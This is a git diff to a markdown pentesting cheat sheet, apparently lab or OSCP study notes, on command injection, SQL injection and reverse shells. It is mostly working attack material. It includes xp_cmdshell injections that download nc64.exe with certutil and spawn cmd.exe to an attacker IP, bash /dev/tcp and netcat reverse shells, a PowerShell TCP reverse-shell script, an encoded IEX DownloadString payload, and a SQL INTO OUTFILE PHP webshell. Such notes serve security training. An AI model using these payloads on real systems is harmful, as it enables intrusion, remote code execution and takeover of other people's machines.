@@ -310,7 +310,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - **Command injection**
   - ⚠️ **execute web shell/RCE-->revere shell**
   - Inspect: ?page=, ?id=, ?cmd=
-  - detect: (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell    
+  - detect:   
+    `(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`          
     `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
   - 💣 get reverse shell  
     1. serve Powercat via Python web server  
@@ -336,6 +337,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
       `offsec' AND 1=1 -- //`
     - time-based
       `offsec' AND IF (1=1, sleep(3),'false') -- //`
+      `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
   - xp_cmdshell
     ```
     impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -350,10 +352,63 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - upload a PHP Backdoor from SQL
     `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
     `192xxx/tmp/webshell.php?cmd=id`  
-  - ddd
-  - ddd
-  
-# Reverse shell
+- 💣 get reverse shell
+  1. SQL probe username/password textbox  
+     `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
+  3. Host nc64.exe on a Web Server  
+     ```
+     wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+
+     sudo mv nc64.exe /var/www/html/
+     sudo python3 -m http.server 80
+     ```
+  5. Start a listener on Kali  
+     `nc -lvnp 4444`
+  7. Use xp_cmdshell download Netcat  
+     `'; EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe C:/Windows/Temp/nc64.exe";--`  
+  9. Trigger Reverse Shell  
+      `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`  
+    
+# ❗Reverse shell  
+- [Reverse Shell Generator](https://www.revshells.com/)
+  - Linux `echo $0`  
+    - /bin/sh  
+    - Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
+    - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
+    - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
+  - Windows `echo %COMSPEC%`  
+    - cmd.exe  
+    - PowerShell: `powercat -c <KALI_IP> -p 4444 -e powershell`  
+    - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
+  - Bypassing web applications (Command injection)
+    1. create shell.ps1 on kali
+       ```
+       $client = New-Object System.Net.Sockets.TCPClient("<kali>",4444)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        while($true){
+          $command = $reader.ReadLine()
+          if($command -eq "exit"){break}
+          $output = (Invoke-Expression $command 2>&1 | Out-String)
+          $writer.WriteLine($output)
+          $writer.Flush()
+        }
+        $client.Close()
+       ```
+    3. Start listener `nc -lvnp 4444`
+    4. Execute the encoded payload on target
+       - ?page
+         `powershell -EncodedCommand <Base64EncodedString>`
+       - RCE
+          ```
+          $payload = "powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')"""
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+          powershell -EncodedCommand $encoded
+          ```
+     5. Get reverse shell successfully  
+  - check if the port is open (FW might block)  
+    `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`   
 - Kali listener
   `nc -lvnp 443`
 - ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
